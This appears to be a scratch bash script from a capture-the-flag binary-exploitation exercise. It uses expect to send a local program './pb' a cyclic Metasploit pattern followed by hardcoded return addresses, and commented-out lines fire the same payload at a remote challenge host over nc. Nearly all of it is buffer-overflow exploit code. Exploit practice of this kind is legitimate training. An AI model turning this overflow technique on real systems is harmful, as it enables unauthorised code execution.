#!/bin/bash

#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6AB
#\x60\x3d\xde\xf7\xff\x7f\xf0\x85\xdd\xf7\xff\x7f\x9e\xb6\xf6\xf7\xff\x7f
#for i in {0..50}; do b=$(/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l ${i}); echo "2\r${b}\x60\x3d\xde\xf7\xff\x7f\x00\x00\xf0\x85\xdd\xf7\xff\x7f\x00\x00\x9e\xb6\xf6\xf7\xff\x7f\x00\x00\r" | nc 167.172.50.208 32222 >> output_nc.txt; echo "${b}"; done
#nc 167.172.50.208 32222
# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5
#`=Þ÷ðÝ÷¶ö÷

#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0ABBBBBBBB
#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7AbABCDEFGH\x60\x3d\xde\xf7\xff\x7f\x00\x00\x9e\xb6\xf6\xf7\xff\x7f\x00\x00
#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0ABBBBBBBB\x60\x3d\xde\xf7\xff\x7f\x00\x00\x9e\xb6\xf6\xf7\xff\x7f\x00\x00     \xf0\x85\xdd\xf7\xff\x7f\x00\x00  \x9e\xb6\xf6\xf7\xff\x7f\x00\x00
#123456789012345678901234567890123456789012345678901234567890


first="2"
second=""
#location="\x60\x3d\xde\xf7\xff\x7f\x00\x00\xf0\x85\xdd\xf7\xff\x7f\x00\x00\x9e\xb6\xf6\xf7\xff\x7f\x00\x00"
location="\x60\x3d\xde\xf7\xff\x7f\xf0\x85\xdd\xf7\xff\x7f\x9e\xb6\xf6\xf7\xff\x7f"
#           60  3d  de  f7  f0  ddf7b6f6f7
string="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"

for i in {1..2}; do
	#string=$(/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l ${i});
	echo "What do you expect?"
	expect <<- DONE
		set timeout -1
		spawn ./pb
		expect ">>"
		send -- "${first}\r"
		expect ":"
		send -- "${second}${string}${location}\r"
		expect eof
	DONE
	echo "Iteration ${i}.  Trying ${second}${string}${location}..."
	#sleep 0.25;
done
